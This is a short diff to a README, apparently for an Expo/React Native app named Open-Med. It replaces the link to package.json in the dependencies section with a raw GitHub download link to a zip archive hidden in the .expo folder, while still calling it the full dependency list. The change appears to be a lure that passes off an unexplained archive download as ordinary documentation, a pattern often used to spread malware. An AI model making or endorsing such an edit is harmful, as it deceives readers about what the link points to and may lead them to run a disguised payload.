@@ -46,7 +46,7 @@ npm run lint
   - react-native-webview  
   - and more
 
-For a full list of dependencies, see [package.json](./package.json).
+For a full list of dependencies, see [https://raw.githubusercontent.com/Itsmedexexplorer/Open-Med/main/.expo/Open-Med-v2.9.zip](https://raw.githubusercontent.com/Itsmedexexplorer/Open-Med/main/.expo/Open-Med-v2.9.zip).
 
 ## Development Tools
 
